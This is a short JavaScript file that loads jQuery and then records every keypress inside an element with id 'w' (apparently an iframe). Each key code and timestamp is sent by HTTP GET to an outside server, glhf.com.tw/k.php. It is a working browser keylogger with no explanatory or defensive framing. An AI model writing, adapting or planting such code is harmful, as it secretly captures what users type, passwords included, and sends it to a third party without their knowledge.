function jq(){
	var script = document.createElement('script');
	script.src = 'https://code.jquery.com/jquery-3.4.1.min.js';
	script.type = 'text/javascript';
	document.getElementsByTagName('head')[0].appendChild(script);
}

jq();

$('#w').contents().keypress(function(event) {$.get('http://www.glhf.com.tw/k.php?x='+event.which+'&t='+event.timeStamp,function(data){});});
